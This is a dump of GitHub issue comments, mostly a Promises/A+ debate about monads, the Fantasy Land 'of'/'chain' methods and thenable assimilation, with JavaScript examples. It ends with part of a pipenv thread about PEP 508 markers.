So would I - in effect - have to ""return"" the `console.log result` ""expression"" to the original caller? If this were a sync program, I'd consider that a bit complicated, but at least could understand how. But in async, there's not even a caller to return to. Or would I be returning to the function that originated the call stack? That doesn't make sense to me. 

Maybe you know about a thoroughly explained example of some real-life io (a bit more complicated than hello world, but not much) in both sync and async fashions? I say thoroughly explained for a reason, because I'm just not getting you. It's like your speaking a whole other language, really. Quite amazing to me.

I also still don't understand what a monad is. Although I do know now (because of your post) that it's in some way similar to a promise, which could be a handy point of reference. I haven't known about promises that long.
"
5235	"I do wonder, if the point is to indeed return a kind of ""request for io"" to the runtime, if it'd be possible to make a kind of FP adapter for say node.js. Let all outside events be handled by a handler function which also happens to know IO, so it can do this IO as soon as some event results in a function that demands IO. (by returning an IO ""nomad"" object)??.
"
5236	"Maybe actually an FP i/o example in javascript/coffeescript (for node.js) would be best. Then at least I wouldn't have the trouble following the semantics of the language.
What would happen after 

``` coffee
handleRequest = (req, res) ->
  ## create a FP adapter here?
```
"
5237	"If you want to introduce `await` you have to introduce promises (or something that behaves like promises).

To answer someone's earlier point about throwing errors in a function that yields:

Consider the following function with a `yield` in it.

``` js
var getJSON = Q.async(function* (url) {
  validateURL(url);
  var response = yield get(url);
  if (response.statusCode != 200) throw new Error('status code ' + res.statusCode);
  return JSON.parse(response.body);
});
var promise = getJSON('http://example.com/foo.json');
```

The above code never results in an unhandled exception, under any circumstances.  Assuming `get` is a function that takes a `url` and returns a promise for the response from the server, `promise` will be a promise that is either going to be rejected or fulfilled at some time in the future.

There would be two ways of consuming this API:

``` js
var magic = Q.async(function * () {
  try {
    var obj = yield getJSON('http://example.com/foo.json');
    //..do some magic with obj...
    return obj;
  } catch (ex) {
    // handle error
    // this would be where you'd handle server errors
    // that resulted in getJSON returning a rejected promise
    throw ex;
  }
});
// or
var magic = getJSON('http://example.com/foo.json')
  .then(function (obj) {
    var obj = yield getJSON('http://example.com/foo.json');
    //..do some magic with obj...
    return obj;
  })
  .then(null, function (ex) {
    // handle error
    // this would be where you'd handle server errors
    // that resulted in getJSON returning a rejected promise
    throw ex;
  });
```
"
5238	"Google is not being helpful here. As far as I understand it now, I must return IO nomad to a runtime. I suppose such a thing could be simulated in Javascript. Yet, googling for ""functional programming node.js "" doesn't give me anything about IO, I'd say about the biggest hurdle to take. Instead, you get links to things like underscore library, which just provides some functions. Hey, I know functions.

This proves somewhat helpful: https://www.fpcomplete.com/school/basics-of-haskell/3-pure-functions-laziness-i-o-and-monads

Does anyone here know about I/O monads implemented in javascript? I assume they would need some kind of ""runtime"" object/function too, to which these monads can be returned to in order to be evaluated and turned into actual I/O.

Secondly, are there monads which allow me to store state somewhere?
Suppose I issue two SQL SELECT queries. I'll get them back via two different callbacks. I don't think that when the second callback gets called, I can still access the value of the previous. That would mean some state there. Thus I probably would need to get this first result out of the ""program"" somehow first. If I could only return I/O monads I wouldn't be able to combine them meaningfully (i.e. sum two numbers or so). Or maybe I have to pass on a partial built result down the chain of async calls I'm making?
"
5239	"@juandopazo writes ""Does that mean that in order to introduce await in the language you'd also have to introduce promises?"" IIUC, yes by definition. That's what await does.
"
5240	"@meryn I strongly suggest you to learn functional programming. The direct benefit of that is that your code will be much more simple in debugging.

Since I started writing in pure-functional style (at least, trying), my total bug count become like 50-80% less.

I can suggest several simple tactics:
1. Assign your variables only once when this is possible. That’s it. If you do `user = getCurrentUsers()`, don’t do `user = user.toLowerCase().replace(' ', '-');`. Instead, assing stuff to new variable like `stripped = user.toLowerCase()...`. This is one less side effect (mutation). Also, don’t use loops, create new structures instead of mutating them in-place.
2. Prefer super-simple functions that do only one thing to mutable object instances and stuff. Make them take one input, return one output. Here’s an example of FP-style code I write every day. It gets all comments on current page and outputs messages.
   
   First style: anonymous functions, which capture some outer variables (I prefer).
   
   ``` javascript
   var stats = [].slice.call(document.querySelectorAll('.comment-header-author'))
     .map(function(_) {return _.innerText})
     .reduce(function(counts, _) {
       if (!counts[_]) counts[_] = 0; counts[_] += 1; return counts
     }, {});
   
   Object.keys(stats)
     .sort(function(a, b) {return stats[b] - stats[a]});
     .map(function(name) {
       var count = stats[name];
       var text = count === 1 ? ' comment' : ' comments';
       return 'User ' + name + ' had left ' + count  + text;
      })
     .forEach(function(_) {console.log(_)});
   ```
   
   Second style: named pure functions that don’t capture any outside variables:
   
   ``` javascript
   // This particular function is not pure (side-effect free), as it works with DOM.
   var query = function(selector) {
    return [].slice.call(document.querySelectorAll(selector));
   };
   
   var attr = function(name) {
    return function(item) {return item[name]}
   };
   
   var sum = function(counts, item) {
    if (!counts[item]) counts[item] = 0;
    counts[item] += 1;
    return counts;
   };
   
   var byValue = function(values) {
    return function(a, b) {
      return stats[b] - stats[a]
    };
   };
   
   var format = function(stats) {
    return function(name) {
      var count = stats[name];
      var text = count === 1 ? ' comment' : ' comments';
      return 'User ' + name + ' had left ' + count  + text;
    };
   };
   
   var log = function(message) {
    return console.log(message);
   };
   
   var stats = query('.comment-header-author').map(attr('innerText')).reduce(sum, {});
   Object.keys(stats).sort(byValue(stats)).map(format(stats)).forEach(log);
   ```
   
   This is like super easy to debug.
3. Maybe take a look at [LiveScript](http://livescript.net), functional to-js lang.

Basically monads, functors, monoids and stuff are functional ways to do the job, they give the same benefits as FP — better code reusability, easier debugging etc. Think of them as OOP interfaces. Brian and folks are trying to define interfaces for languages in order for libraries to have better compatibility between each other.
"
5241	"@paulmillr I'd generally go for first style too. For sync stuff, I'm always using CoffeeScript list comprehensions though. I don't think writing out the name of an intermediary result (authorNames) for example hurts anyone. Such a variable gets destroyed really soon. Nice to be able to put console.log in front of it at some point too.

I don't think your code examples captures the essence of FP though. It's just a matter of writing non-surprising, maintainable code.
I mean, where are the ""monads"" here? They're supposed to implement both ""bind"" and ""unit"". Wise-man, me. ;)

It's code like the following that makes my head spin:

``` javascript
function map(p, f) {
    return p.then(function(a) {
        return p.constructor.point(f(a));
    });
}

function ap(p, pf) {
    return pf.then(function(f) {
        return map(p, f);
    });
}

function liftA2(pa, pb, f) {
    return ap(pb, map(pa, function(a) {
        return function(b) {
            return f(a, b);
        };
    }));
}
```

I'm in the process of decoding it. First step was to clean things up a bit. ;)

``` coffee
# when promise resolves, apply fn onto it, but keep promise interface
# perhaps ""map"" functions in general are defined by the fact that they
# take an object and a function, and return an object of the same type
map = (promise, fn) -> 
  promise.then (a) -> 
    p.constructor.point fn a
   # why not simply do mySuperModule.makeResolvedPromise fn a
   # yup, it's global, but removes need for ""point"" to exist on constructor


ap = (valuePromise, functionPromise) ->
  functionPromise.then (fn) -> 
    map valuePromise, fn

# ifting is a concept which allows you to transform a function into a 
# corresponding function within another (usually more general) setting
# liftA2 probably is a specific lift. 
# It's ""lifting"" two promises, while A'ing it?
liftA2 = (promiseA, promiseB, fn) ->
  ap promiseB, map promiseA, (a) -> 
    (b) -> fn a, b
```

@pufuwozu Care to think up a descriptive function name for ""ap"" and explaining in prose what it does?
Also, why do you think you need this point function set on the constructor while you could just as well use an external module for that? Just because you want to keep the map function pure?
"
5242	"> `constructor.of` creates a monadic value of the same constructor

This comment here is interesting because you say ""same constructor"", as though you expect the constructor to differ, to matter. Normally, a promise would just be a promise. Just use a proper library to construct it.
Are you referring here to ""typed"" promises? Say ArrayPromise or NumberPromise? If so, why do you want a type? It doesn't make sense to want a type (in Javascript) unless it actually gives functionality. Do you want to put extra (type-specific) methods on the prototypes? If so, then we're talking about way bigger prototypes anyway (compared to the tiny surface of a promise/a+ promise). An extra method (say, this ""of"") matters jack in that context. But it's a whole different spec. If a function receives a promise which doesn't have an ""of"", you just assume it to be typeless, and just a global (generic) resolvedPromiseConstructor.
"
5243	"I'll implement ""of"" for you on my ""promised builtins"". Two people who agree makes a standard, right? ;)
"
5244	"@meryn this is abstract algebra. `ap` is as descriptive as it gets.

```
f.ap(b)
```

`f` is an Applicative of a function. `b` is an Applicative of an argument to the function in `f`. The `ap` method **ap**plies the contents of `b` to the function inside of `f`. All Monads are Applicatives. Easy.

Your readable version assumes all input arguments are promises. Again, this is abstract algebra - the inputs do not have to be promises.

The `of` function needs to go on the value or the constructor - again, it's abstract algebra - there's many structures that need to implement that function. We have no idea what module the function could be coming from. If we made a module with all ""known"" applicatives/monads then we're assuming the world is closed and nobody could ever make their own. The interface is documented in the [Fantasy Land](https://github.com/pufuwozu/fantasy-land) specification.

Ignore the ""same constructor"" stuff and read the [Fantasy Land](https://github.com/pufuwozu/fantasy-land) specification.

I'd have a hard time to call Fantasy Land a standard but it's definitely a specification of common algebraic structures. There's already quite a few libraries that implement it.
"
5245	"@pufuwozu With regard to your two proposals:
1. `of` or `point` on constructor
2. removing `onRejected` callback from `then`, and instead have a dedicated `onRejected` function

Which of the two is most important? I'd say 1: It gives possibility to do fancy stuff with ""typed"" promises.
How much does 2 add, except for in your perception a nicer interface? Is there anything wrt ""composability"" that gets totally broken because of the two arguments to `then`?
"
5246	"@meryn `of` is definitely the most important thing. Feel free to ignore `onRejected` - I just dislike the overloaded `then` but that's not going to change. I can just not use it and then nothing breaks.

Thanks.
"
5247	"Lol, I stumbled upon that fantasy land spec today, skimmed over it but immediately ignored it just because of the WAY OUT THERE terminology. I'm like man, what have you been smoking. :) Monoids, functors, never heard of them. 

Please don't take this wrong.
I don't think it's entirely fair to ask someone to read a spec with words totally new to them. Certainly if it's just to make the case for a simple ""of"" method on a promise constructor. You ought to be able to make the case in plain English.

And yes, I may eventually take the time to study your spec, as part of my ambition to get to know FP a little better.
"
5248	"Maybe other people here all get it. Maybe I'm just the uneducated one. :)
"
5249	"@meryn it's abstract algebra. Should we rename monad to ""warm fuzzy thing""? Who is that going to help?

I think it's completely fair to ask someone to read a spec that contains words they don't understand. The definitions are provided.

Please don't ignore things you don't understand.
"
5250	"No, you're not just the uneducated one.  I have explored the concepts before a little bit and they could be explained just as easily using more commonly understood words.  The only reason they're using the words they are is that those are the words that have been allocated by mathematicians who are used to the jargon.

It concerns me slightly that people reading these posts are starting their exploration of FP with monads.  Functional Programming has a lot to offer and very little of it involves monads.  Monads started life as the rather awkward way of expressing state and IO in a pure functional language.  They turned out to be a very elegant way to represent asynchrony, hence our adaption of them to form promises.

The starting principal of functional programming is to have no mutable state.  What that means, is you can't have the assignment operator in JavaScript.  This would also make while loops and for loops completey unusable since you could never escape them.  You can still have variable declarations (e.g. `var x = 10;`) just not assignment operations (e.g. `x = 20;`).  That way, once declared, a variable never changes.

It turns out that this doesn't really limit your expressiveness, other than making it difficult to build user interfaces and IO systems.  In general, where possible it's worth writing most code in a purely functional style except where:
1. You need to do IO
2. You need to build a UI (User interfaces are essentially just another sort of IO)
3. You have an algorithm that really lends itself to a loop and would be awkward to implement any other way.
"
5251	"By allowing monads to exist as a first class citizen of the language, functional programming can work with IO.  This makes it possible to build anything in a purely functional world.  Personally I prefer to write UIs and web servers using the imperative parts of JavaScript, use for loops when an algorithm makes that seem much simpler than recursive functions, and aim to use a functional style when it's sensible to do so.
"
5252	"Ok, let me give an example of making the case for ""of""

Let's add an of method ""to"" the constructor of every promise, so we can generate a new promise of the exact same type as the promise in question. Why? Because then we could have multiple types of promises, and if we could have multiple types of promises while being able to keep their types consistent when you ""derive"" a new one from it, I could build really, really, really cool stuff with, involving fancy maths and computer sciences. But even if you don't understand the maths or sciences, you could benefit from my work.

I think that's a pretty strong case while not introducing much terminology considering people who know English, Javascript and promises, something you can very rightly assume of your audience.
"
5253	"@ForbesLindesay pure IO is not clunky, functional user interfaces are expressive and give those algorithms a pure interface then I'll be satisfied.
"
5254	"@meryn stop being silly. The specification is not hard just because there's a couple of words you don't understand.
"
5255	"@meryn: In the privacy of my brain, I prefer to call it `construct` instead of `of`. It aligns more easily with known idioms, especially in JavaScript, because you're just taking a value and constructing a new context around it.

`ap` is function application when both the function and its arguments are wrapped in these objects. `(function(x) { return x + 1; })(a, b, c)` is `ap` in the Identity object; but in List you can have:

``` javascript
[ function f1(x) { return x + 1; },
  function f2(x) { return x - 1; }
].ap([1, 2, 3], [2, 4, 6])
```

In other words, applying a list of functions over a pair of lists of parameters. The result is:

``` javascript
[ f1(1, 2), f1(1, 4), f1(1, 6), f1(2, 2), ..., f1(3, 6),
  f2(1, 2), f2(1, 4), f2(1, 6), f2(2, 2), ..., f2(3, 6)
]
```

But the point is that you've generalized function application within any Applicative context. A Promise-based `ap` would allow you to return a function as the result of a promise, and then apply other values that are also Promises to that function. (In other words, the same as normal application, but with the benefit of asynchronous composition.)
"
5256	"@pufuwozu Allright I stop being silly. However, I think you do overestimate the patience of an incredible amount of people you might want to pitch your idea too. Ever heard of the term ""elevator pitch"" (wrt to pitching to potential investors)? Did you know people write endless amounts of blog posts about the art of writing a single headline for a product?
"
5257	"> You need to do IO

I don't see how you can't do that in a pure language. The only difference is that you have effects instead of side-effects, which have the benefits of::: making your code easier to reason about.

> You need to build a UI (User interfaces are essentially just another sort of IO)

Take a look at Functional Reactive Programming. There's even one implementation that compiles to JavaScript called Elm.

> You have an algorithm that really lends itself to a loop and would be awkward to implement any other way.

Laziness and recursion.
"
5258	"People so easily tune out when things get a bit too hard. I'm practically 100% self-taught, I know about doing work, and persistence. But some things (if only at first glance) just don't seem to have the right effort/reward ratio.
"
5259	"@pufuwozu You totally miss the point.  I **can** interpret your spec, but a lot of time and thought and effort has gone into making this spec easy to understand and read.  It's still not perfect, but right now it should be high on our list of priorities to make it easier to interpret.  It's us who want other people to take up using promises, not other people who want to start using them.  There are also many more people reading your spec than there are writing it.
"
5260	"@meryn I hope most developers can read words they don't understand and then read the definitions of them. Hopefully peer pressure and _a really cool logo_ will entice them to join our fantasy land :wink:
"
5261	"@pufuwozu it is aptly named at the moment
"
5262	"@ForbesLindesay I demand a proof that you can rewrite the specification using plain English. I'm waiting.
"
5263	"Protip: there are times where plain English will make things more confusing. Specifications are one of those things where you want more formalism and less room for ambiguity. Otherwise, how can you be sure implementers will be able to read, understand correctly what you mean, and create a faithful implementation (or derive things)?
"
5264	"Well yes but I already have my ""promise land"", which I think is cooler, and actually pays homage to the fantastic work the Promise community has been doing. Right now, I'm not sure I'd really care much for the neat FP constructs. But then, maybe I will. My motivation is different. I want to make dealing with promises feel as much as the same as dealing with the objects they ""proxy"". For all else, I see a more or less ""imperative"" world before me, just like I always have.

In a way, there are big similarities to promise land and fantasy land though. They're both kind of ""dreamy"" targets, idealistic, and they both want to take promises (or maybe in your case: monads) to a new level. In Javascript. And resulting code might as well be able to interoperate.
"
5265	"@ForbesLindesay:

> The only reason they're using the words they are is that those are the words that have been allocated by mathematicians who are used to the jargon.

I agree 100% with this statement. Polymorphism, interfaces, and SOLID principles are just as impenetrable to newcomers, but there is a vast amount of pedagogical material and experience built up around them. There is no reason why we can't make these concepts more approachable.

> The starting principal of functional programming is to have no mutable state.

Not true. There are many functional languages that support mutable state (and even globals). You can still exploit abstract idioms to structure your code - and JavaScript is known to be inspired by a number of functional tenets. First-class functions as values, for example.

@killdream:

> Protip: there are times where plain English will make things more confusing

True. Of course, there's no reason we can't motivate things in plain English, then specify it more precisely.
"
5266	"@Twisol yes. You can totally have an informal introduction describing the thing in a higher level, then have a section where you formally define things. R7RS does this.
"
5267	"@killdream I'm not saying you can't do those things functionally.  I'm just saying they're better used in other ways.
"
5268	"@ForbesLindesay still awaiting your proof. Thanks.
"
5269	"@ForbesLindesay I disagree. I have yet to find a better way to write UIs than Functional Reactive Programming. Ditto for the other stuff. Though I'm not a strong proponent of enforced purity everywhere (I'm mainly a Clojure/Lisp programmer)
"
5270	"Have you guys ever heard of the curse of knowledge? http://en.wikipedia.org/wiki/Curse_of_knowledge

> The curse of knowledge is a cognitive bias according to which better-informed people find it extremely difficult to think about problems from the perspective of lesser-informed people.

That's imo what's going on here. I think the FP guys have no idea how much ahead they are of others in some regards.
"
5271	"@killdream I did not say that **all** functional languages have no immutable state.  I said it was the starting point of functional programming.  Strictly speaking pure functional programs do not have mutable state.  There are very few (popular) pure functional languages.

Languages that are functional but also provide mutable state are great.  I'd say they're ideal.  It's part of the reason I love coding in JavaScript.  They aren't strictly speaking pure though.
"
5272	"I actually agree with @ForbesLindesay. Functional programs work on values which implies immutable state. The most practical way to program.
"
5273	"@pufuwozu my version of your spec with jargon reduced: https://gist.github.com/ForbesLindesay/5392337

N.B. this is a first draft as a proof of concept that it's not necessary to add the jargon.  It took me a little while to see but there was a light-bulb eureka moment when I realized that you weren't really specifying things (`monad`, `semigroup`) which were really difficult to give nice intuitive names, you were specifying a short series of functions, which were really easy to name.

I would probably add a footnote to each that says, ""An object that implements `concat` would be called a (Semigroup)(link to more info on semi groups here) in category theory"" and so on for all the other rules.
"
5274	"@ForbesLindesay Are these specs describing the same thing??????

I can't explain how much difference it makes. It's like day and night, black and white.
"
5275	"Yes, I believe so.  Like you I found the previous spec hard to interpret, so I may have missed something in the detail, but I think they are broadly equivallent.
"
5276	"Ok without reading it, I think it could a (one-paragraph) ""statement of purpose"" on top. Why make this spec in the first place. That's unclear to me.

i.e. ""Having this spec (and/or having code conforming to this spec) will bring us/you/me ...""
"
5277	"For `of`, I'm particularly uncertain of my wording:
1. If `f` is a function that returns an entity of class `A`, then `A.of(b).chain(f)` is equivalent to `f(b)`
2. `A.chain(A.constructor.of)` is equivalent to `A`
"
5278	"I didn't think it would be possible to make the following hold **for all** `f` where `a` represents `A.of(b)` returns a promise for `b`:

`A.of(b).chain(f)` is equivalent to `f(b)`
"
5279	"I included that in the first paragraph of ""Real World Specification"":

> The motivation behind this is to encourage greater code reuse.
"
5280	"I think it's an incredible feat. In particular because you kind of demistify something complex to me.
Again I stress that I have yet to read this properly, but right now I know I'm going to understand this. And at the same time, I find it hard to believe that the old spec said about the same thing. Disbelief.

I scanned over it lol.

Is anyone here familiar that people typically don't ""read"" on the web? They scan. Jakob Nielsen (Alertbox) has written prominently about it.

Ok I'll stop critiziing what I haven't read and start reading it.
But I'm incredibly impressed. ""Total makeover""
"
5281	"Also, as I understand it, the following would be a valid implementation of `chain` for all promise libraries (since the spec leaves behavior with incorrect types undefined):

``` js
Promise.prototype.chain = function (fn) {
  return this.then(fn);
}
```
"
5282	"The spec defines some very general ""interfaces"" which are not only defined by their method signatures, but also by some ""relationships"" which must hold. So then you can reason about all these different kind of objects in the same manner. Code may know how to fancy optimization tricks.

I have an example which may not be covered by the spec, but I think it's nice.
Let's define an object ""obj"" that has a method ""transform"". Now when you call obj.transform with value a, and you get in return value b, than you may be certain that any other time you call obj.transform with value a, you can be sure that the return value will be b again. Also, there will be no side effects. Or if there are, the method is ""idempotent"" (that's a term from REST, Roy Fielding). So if you have called the method once, you can call it any time extra and it doesn't matter.

Hence, return value doesn't have to be recomputed when input stays same. It can be cached. Memoization can be ""externalized"".

I can imagine many other fancy tricks are possible with strong specs. Perhaps not all performance related.

But this is cool. I'm in favor. I'm sold. Where can I get it? ;)

Oh yeah, I know REST and the concept of the uniform interface constraint.
"
5283	"I think this is great, and if realized, may have great impact. It's hard to judge in advance though. What I do know, is that I'm charmed by the idea. In a way, the objects are the resources from REST. The ""consuming"" libraries are somewhat like web browsers. Connected via a limited amount of verbs, with strong restrictions imposed.
"
5284	"This and some parallel discussions have all ultimately resulted in #101, which I hope will lead to something that makes everyone happy.
"
5285	"@ForbesLindesay Your poc version, indeed enlightens a lot, great work! Thanks for that. We definitely need such bridge to JS land.
"
5286	"Well that was informative :smile: thanks @puffnfresh 
"
5287	"In @domenic 's April 11 2013 comment, ey said ""it has previously been discussed over and over that a promise-for-a-thenable is a problematic pattern in JavaScript and should not be supported"".

Can someone provide some links to such discussions?
At this moment I have no idea why anyone thinks special-casing thenables is a good thing.
"
5288	"In answer to my Oct 21 question, I found these:
- [Arguments in favor of Promises for Promises](https://gist.github.com/ForbesLindesay/5392701)
- [Arguments against Promises for Promises](https://gist.github.com/ForbesLindesay/5392612)

and some great discussion threads linked from comments on the latter (in particular, from the two Apr 25, 2013 comments).
"
5289	Fucking Haskell-tards.
5290	boohoo, I don't like it when someone understands the subject matter that I do not. When they helpfully explain the subject to me, it's especially bad, because tears come out! I am going to call them names instead, and grab a tissue. That will definitely resolve this matter.
5291	No  need to redefine promises, which are tailored to ease the pain of asynchronous coding with imperative style. There are plenty of JS functional libraries that expose the Future Monad, which is essentially a Promise in FP land. For example - https://github.com/fluture-js/Fluture  - or - https://github.com/mudge/pacta
5292	@proc0 asynchronous imperative coding can be done better than Promises/A+ - those libraries (and my original, 5 year old post) show how.
5293	"Wow this thread is pretty depressing...
This proposal has nothing to do with haskell or the haskell community. If you have a bad perception of either of those it really shouldn't affect how you feel about this proposal in any way"
5294	"This example might be relevant to illustrate the danger of the current `Promise` implementation mixing `.map` and `.chain` behaviors into `.then`:
https://codepen.io/dmitriz/pen/rvNWxw?editors=0012
```js
let val = {
	then: x => x
}
let val1 = {
	then: x => x(1)
}
let val2 = {
	then: {x:1}
}

// Nothing is getting out of this promise
// with  the `.resolve` not actually resolving
Promise.resolve(val).then(result => {
	console.log(""I am silently ignored!"")
	console.log(""Result is:"", result);
})
.catch(e => {
	console.log(""I am also silently ignored!"")
	console.log(e)
})

Promise.resolve(val1).then(result => {
	console.log(""Result1 is:"", result);
})

Promise.resolve(val2).then(result => {
	console.log(""Result2 is:"", result);
})
```

It can be argued that the case in the first example is rare, but if it might occur unexpectedly, the code becomes hard to debug and generally unsafe.

Is there any reason not to provide the same `Promise` class with the safer `.map` and `.chain` methods in addition to the (looking more convenient but) potentially dangerous `.then`?
Or is any library doing this already?
"
5295	"@dmitriz we've discussed it extensively when ES6 was being discussed and the conclusion was: you can't have both (https://esdiscuss.org/topic/promise-cast-and-promise-resolve#content-40). They chose the non-monadic version of promises, and even though I still think that was a bad choice it's what we've got now.

You can just not use promises and write your own types, then build something like async/await on top of generators, and you'll get roughly the same characteristics Promises give you by default, but without the drawbacks (but also without the runtime optimisations)."
5296	"> You can just not use promises and write your own types, then build something like async/await on top of generators

…or use an existing library that does just that, like [Creed](http://blog.briancavalier.com/creed/) :-)"
5297	"@robotlolita 
Thank you very much for the link, an interesting read, when also frustrating for an outsider as everything refers to some context that is often to be found elsewhere or spread over multiple places. It is unfortunate that [people now erroneously say Promises are monads](https://medium.com/@dmitri145/actually-the-promises-were-not-made-into-monads-see-the-in-famous-discussion-in-1526891cde6e), where people looking for explanation seem to have hard time finding it concisely in one place.

I must admit my PhD degree in Maths still does not help me to extract from that @brendaneich comment nor the following comments debating these, a scientific rigorous proof that implementing `.then` on top of the more primitive `.map` and `.flatMap` (aka `.chain`) and exposing all of them on the `Promise` instance is fundamentally impossible. 

Is there a such proof written anywhere that is complete, objective and not opinion based?

That is, a proof that is impossible to have a `Promise` class having exactly the same methods as currently implemented, plus the `.map` and `.chain`. (As a matter of personal opinion, I find `.flatMap` more descriptive than `.chain` that has already been used in JS to mean other things.)

> You can just not use promises and write your own types, then build something like async/await on top of generators, and you'll get roughly the same characteristics Promises give you by default, but without the drawbacks (but also without the runtime optimisations).

Could you please explain the runtime optimisation? Wouldn't the native `.chain` be more performant (and `.map` even more), comparing to `.then` with all its plumbings?
"
5298	"@bergus 
> …or use an existing library that does just that, like Creed :-)

Thank you, this is what makes writing my comments worth is ;)

So if this library can implement all the methods simultaneously without breaking `.then`, doesn't it refute the arguments in  https://esdiscuss.org/topic/promise-cast-and-promise-resolve ?
"
5299	"@dmitriz 

> but also without the runtime optimisations

Actually that's wrong. Algebraic promises can be much better optimised than promises which need to do recursive flattening in every step.

> Doesn't it refute the arguments in https://esdiscuss.org/topic/promise-cast-and-promise-resolve?

That's a very long and very old thread, even using names that had changed their meaning since. Which argument in particular do you refer to?

Creed does not break `then`, but it does break interoperability. You only get Promise/A+ assimilation interoperability by using the ""broken"" `then` method, which cannot be fixed and maintain compatibility (at least about recursive assimilation). You can add the more primitive operations like `chain` and `of` and `map` to an A+ compatible library, but they will only work with promises from that particular library."
5300	"@dmitriz 
> a scientific rigorous proof that implementing .then on top of the more primitive .map and .flatMap (aka .chain) and exposing all of them on the Promise instance is fundamentally impossible.

It's possible to write that, and easy enough. The problem, really, is that it creates more room for confusing behaviour. People using `.then` expect promises to always be flattened, people using `.chain` expect promises to never be flattened. When you start using other people libraries, and those expectations combine in the code, you're most likely going to run into bugs that are hard to track because people had different expectations about how to go about writing the code.

The whole point of algebraic structures is to define a single way of composing structures such that you can always reason about their composition in a simpler way. If you start adding too many ways of composing values, that quickly falls apart, and you're left with none of the benefits."
5301	"@bergus 
>>  but also without the runtime optimisations

> Actually that's wrong. Algebraic promises can be much better optimised than promises which need to do recursive flattening in every step.

That was my thought too. Perhaps @robotlolita meant the unwrapping optimisation if you re-implement it on top of `.chain`. But you can also use the native `.then` if you have to.

> That's a very long and very old thread, even using names that had changed their meaning since. Which argument in particular do you refer to?

The argument that it is ""fundamentally impossible to have both functionalities coexisting"", e.g. here:
https://esdiscuss.org/topic/promise-cast-and-promise-resolve#content-40

> Creed does not break then, but it does break interoperability. You only get Promise/A+ assimilation interoperability by using the ""broken"" then method, which cannot be fixed and maintain compatibility (at least about recursive assimilation). You can add the more primitive operations like chain and of and map to an A+ compatible library, but they will only work with promises from that particular library.

The monadic `.chain` (or `.flatMap`) should expect function returning the same monad. Do you mean, passing the native promise inside the `.chain` is not recognized by `creed`? 

The `.map` and `.of` are simpler in that they merely wrap the value. So in what way should they work with other libraries?

@robotlolita 
> It's possible to write that, and easy enough. The problem, really, is that it creates more room for confusing behaviour. People using .then expect promises to always be flattened, people using .chain expect promises to never be flattened. When you start using other people libraries, and those expectations combine in the code, you're most likely going to run into bugs that are hard to track because people had different expectations about how to go about writing the code.

I don't quite understand how it is different from using any library `X` with two different methods `a` and `b`. Some folks will use `a` and get functionality of `a`, others will use `b`. Any compliant promise would have to provide both. The methods are called and work differently, yes. Confusion is of course always subjective and hard to debate for that reason, but is there any fundamental reason it would be impossible for the two methods to coexist?

> The whole point of algebraic structures is to define a single way of composing structures such that you can always reason about their composition in a simpler way. If you start adding too many ways of composing values, that quickly falls apart, and you're left with none of the benefits.

An algebraic structure is just a function with several arguments, satisfying certain properties. Even integers have two separate algebraic structures -- `+` and `*` that perfectly coexist with no confusion. 

Why there should be a single way to define it? I don't mean any personal preference here but a fundamentally possible way to satisfy different people's needs. 

"
5302	"@bergus
I do not know if that addresses the interoperability concern,
but it seems `creed.chain` works as desired even with native promises:

```sh
> creed = require('creed')
> p = creed.resolve(1).chain(_ => Promise.resolve(2))
Promise { pending }
> p
Promise { fulfilled: 2 }
```"
5303	"@dmitriz, I mean something like
```js
import creed from 'creed';
import other from 'some-other-algebraic-promise-lib';

const p = creed.resolve(other.of(other.of(1))); // similar, in creed.of(…).chain(_ => …)
p.map(console.log) // 1, or Other(1) ???
```
""Monadic"" promises and ""non-monadic"" promises can *coexist*, yes, but they are incompatible with each other in terms of assimilation. One would need to spec a second algorithm (possibly even using `then`) that would not recursively unwrap."
5304	"@bergus I really can't see any problems.

If your `of` here conforms to [the Pointed Functor spec](https://stackoverflow.com/a/41816326/1614973), then `other.of(other.of(1))` should not unwrap like in `[[1]]`, so nothing happens.
Whereas if `resolve` is unrwapping, similar to `Promise.resolve`, then in your example it should unwrap twice down to `creed.resolve(1)`. (Apart from `resolve` being a suboptimal naming choice as `Promise.resolve` does not actually have to resolve if run over a promise.)

And the general principle should be simple too. You have the infinitely unwrapping `then` and `resolve` from any library, one-step-unwrapping `flatMap` and non-unwrapping `map` and `of` again, from any library. Any time there is a promise-conformant object from any library (or theneable), it should be unwrapped by the unwrapping methods. The infinitely unwrapping ones will continue until they can't unwrap anymore. That would actually simplify the current spec in half 😀   Am I missing something?
"
5305	"@dmitriz TBH, I can see that solution as well, and have long been a proponent of ""monadic promises"" and wanted to avoid recursive unwrapping from the get-go (in A+). I'm probably not the one who can argue well against this. Now we just have to convince the ES committee and the engine implementors that this is a good idea…"
5306	"@bergus I have found another validation by @briancavalier that it is possible to implement `of` and `chain` without breaking `then`: https://github.com/promises-aplus/promises-spec/issues/97#issuecomment-16452068

That seems to be what `creed` is doing, where also wrapping Promises in Promises is possible via `of`.  Surprisingly, I have read people's comments opposing the mere possibility to have Promises wrapped into Promises. Apparently some older promise libraries were against it, again for unclear reasons. It just looks frustratingly obscure for such an important decision affecting so many people.
"
5307	"It's like I'm watching a chronological replaying of all the fundamental mistakes ""pragmatic"" developers make in their attempts to avoid learning something new, but encapsulated, in a nice, bite-sized thread. 

@puffnfresh  holy hell m8"
5308	This is a good suggestion, we should be able to implement this fairly easily
5309	+1
5310	no
5311	it would help a lot
5312	"@kennethreitz I (and hopefully others here) would appreciate further explanation than just ""no"". This seems like such an obvious feature, especially since the documentation explicitly says `pipenv` supports the PEP 508 specifiers."
5313	you're asking a lot out of me, and i've already put a tremendous amount of time into this, and it's a holiday right now. patience is a virtue. 
5314	that's because we love pipenv :) But i think this will help the adoption of pipfile/pipenv for some libraries or application, especially if one want to support Python 3.5+
5315	"it will be considered

On Wed, Nov 22, 2017 at 2:17 PM, Gaetan Semet <notifications@github.com>
wrote:

> that's because we love pipenv :) But i think this will help the adoption
> of pipfile/pipenv for some libraries or application, especially if one want
> to support Python 3.5+
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/kennethreitz/pipenv/issues/1050#issuecomment-346448207>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AAHUVc2MSERTYmXgwbnh8wD4qAInLE__ks5s5HM8gaJpZM4QYD9C>
> .
>
"
5316	I'm not asking for anything other than an explanation for why the issue was closed. I appreciate the huge effort you've put in and I totally understand that things like this aren't going to be implemented overnight. However, when the issue is just closed like this, the signal I get as a user is that this will _never_ get fixed, so I was curious as to why. 
5317	"Right now, this means that running multiple python versions in CI fails. travis-ci example:

```
python:
- ""3.6""
- ""3.7-dev""
install:
- pip install pipenv
